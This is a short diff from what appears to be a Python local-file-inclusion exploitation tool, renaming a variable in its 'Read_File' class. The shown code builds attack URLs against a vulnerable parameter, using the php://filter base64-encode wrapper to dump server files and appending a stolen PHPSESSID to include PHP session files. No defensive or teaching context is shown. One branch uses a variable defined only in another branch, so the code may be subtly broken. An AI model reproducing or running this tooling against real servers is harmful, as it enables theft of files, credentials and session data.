@@ -164,11 +164,11 @@ class Read_File:
                     if self.args.base64:
                         if 'sess_' not in self.args.read :
                             phpfillter = 'php://filter/read=convert.base64-encode/resource='
-                            self.LFI = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
+                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
                         else:
-                            self.LFI= self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))  
+                            URL= self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))  
                     elif "sess_" in self.args.read: 
-                        self.LFI = self.args.Vulnurl+LINE.replace('\n','')+self.args.read+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))         
+                        URL = self.args.Vulnurl+LINE.replace('\n','')+self.args.read+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))         
                     else:    
                         URL = self.args.Vulnurl 
                     if not "sess_" in self.args.read:    
